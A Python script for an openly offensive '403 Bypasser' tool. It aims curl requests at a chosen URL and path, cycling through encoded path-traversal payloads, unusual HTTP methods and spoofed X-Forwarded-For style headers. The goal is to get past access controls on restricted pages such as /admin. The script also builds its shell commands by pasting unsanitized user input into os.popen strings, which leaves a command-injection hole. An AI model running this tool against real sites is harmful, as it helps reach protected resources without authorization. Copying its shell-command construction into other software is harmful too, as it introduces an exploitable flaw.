import os
import sys
import argparse
import warnings
from winreg import *

def color_regedit():
    virtual_terminal = "Console"
    reg_handle = ConnectRegistry(None, HKEY_CURRENT_USER)

    key = OpenKey(reg_handle, virtual_terminal, 0, KEY_WRITE)

    try:
        SetValueEx(key, "VirtualTerminalLevel", 0, REG_DWORD, 0x1)
    except EnvironmentError:
        print("Registry Create Fail...")

def url_injection():
    payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
   
    for url in payloads:
        inject = target + url
        try:
            command = os.popen("curl -k -s -I %s" % (target + url))
            status = command.read().strip().split(" ")[1]
            print(" \033[1;32;40m[+] payload [%s%s] => [ %s ]\033[0m" % (target, url, status))
        except:
            continue


def method_injection():
    print("")
    payloads = ["GET", "POST", "CONNECT", "PATCH", "TRACE", "HEAD", "OPTIONS", "LABEL", "ACL", "MERGE", "BASELINE-CONTROL", "SEARCH"]
    
    for method in payloads:
        command = os.popen("curl -k -s -I -X %s %s" % (method, target))
        status = command.read().strip().split(" ")[1]
        print(" \033[1;32;40m[+] payload [%s] [%s] => [ %s ]\033[0m" % (method, target, status))

def host_header_injection():
    print("")
    payloads = ["X-Forwarded-For: 127.0.0.1", "X-Originating-IP: 127.0.0.1", "X-Remote-IP: 127.0.0.1", "X-Client-IP: 127.0.0.1", "X-Forwarded-Host: 127.0.0.1", 
    "X-Host: 127.0.0.1", "X-Real-IP: 127.0.0.1", "Base-Url: 127.0.0.1", "Client-IP: 127.0.0.1", "X-Forward-For: 127.0.0.1", "Referer: 127.0.0.1", "Content-Length:0"]
    for header in payloads:
        command = os.popen("curl -k -s -I -X GET -H \"%s\" %s" % (header, target))
        status = command.read().strip().split(" ")[1]
        print("\033[1;32;40m [+] payload [ %s ] => [ %s ]\033[0m" % (header, status))       


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="403 Bypasser : python bypass-403.py -u https://www.example.com -p /admin")
    parser.add_argument('-u', help='Provide url', required=True)
    parser.add_argument('-p', help='Provide the path' , required=True)

    color_regedit()
    args = parser.parse_args()
    url = args.u
    path = args.p
    target = url + path

    print("""\u001b[36m
                                                  
 ___ ___ ___    _____                             
| | |   |_  |  | __  |_ _ ___ ___ ___ ___ ___ ___ 
|_  | | |_  |  | __ -| | | . | .'|_ -|_ -| -_|  _|
  |_|___|___|  |_____|_  |  _|__,|___|___|___|_|  
                     |___|_|        \u001b[0m                  
						
			\033[1;33;36m @ASJ \033[1;33;0m

            - [ TARGET : %s ] -
	""" % (url))
    print("\u001b[31m [+] - FOUND [ %s ] Status Code -> [ %s ] \033[1;33;0m\n" % (target, os.popen("curl -k -s -I %s" % (target)).read().strip().split(" ")[1]))
    
    url_injection()
    method_injection()
    host_header_injection()